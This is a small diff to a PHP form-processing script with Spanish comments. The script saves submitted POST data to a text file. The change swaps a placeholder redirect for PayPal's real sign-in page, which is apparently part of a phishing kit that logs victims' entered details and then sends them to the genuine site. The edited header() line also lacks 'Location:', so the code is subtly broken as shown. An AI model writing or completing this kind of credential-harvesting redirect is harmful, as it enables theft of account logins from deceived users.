@@ -9,7 +9,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     file_put_contents("datos_formulario.txt", $datos, FILE_APPEND);
 
     // Redirigir al usuario a una página específica
-    header("Location: https://www.ejemplo.com/pagina-redireccionada.html");
+    header("https://www.paypal.com/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount%2Fsummary&state=");
     exit;
 }
 ?>
